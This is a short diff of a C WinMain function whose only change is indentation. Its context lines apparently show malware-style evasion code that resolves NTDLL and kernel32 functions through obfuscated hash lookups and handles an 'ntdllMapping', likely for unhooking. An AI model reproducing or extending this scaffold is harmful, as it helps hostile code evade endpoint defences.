@@ -15,8 +15,8 @@ int WinMain(int argc, char* argv[]) {
 		}
 	*/
 
-    // Get handle to NTDLL an kernel32
-    HMODULE sysmod = fun002gmh(0x99225BE9);
+    	// Get handle to NTDLL an kernel32
+    	HMODULE sysmod = fun002gmh(0x99225BE9);
 	HMODULE mod = fun002gmh(0xCAF2D14E);
 	fnfun008vp fun008vp = (fnfun008vp)fun001gpa(mod, 0x12BCF846);
 
@@ -128,5 +128,5 @@ int WinMain(int argc, char* argv[]) {
 	fun007ch(ntdllMapping);
 	FreeLibrary(sysmod);
 
-    return 0;
+    	return 0;
 }
